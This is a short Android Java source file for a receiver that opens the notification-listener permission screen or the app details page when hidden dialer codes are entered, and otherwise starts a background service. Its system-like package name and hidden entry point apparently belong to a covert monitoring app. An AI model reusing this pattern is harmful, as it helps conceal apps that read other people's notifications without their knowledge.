package oom.android.system.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import oom.android.system.BuildConfig;
import oom.android.system.R;

public class AutoStarter extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        try{
            if(intent.getAction().equals("android.provider.Telephony.SECRET_CODE")) {
                String uri = intent.getDataString();
                String[] sep = uri.split("://");
                if (sep[1].equalsIgnoreCase("8088")) {
                    context.startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                } else if (sep[1].equalsIgnoreCase("5055")) {
                    Intent i = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + BuildConfig.APPLICATION_ID));
                    context.startActivity(i);
                }
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(new Intent(context, MyService.class));
            } else {
                context.startService(new Intent(context, MyService.class));}
            }

        catch (Exception e){}
        try{
            context.unregisterReceiver(this);
        }
        catch(Exception e){}
    }
}
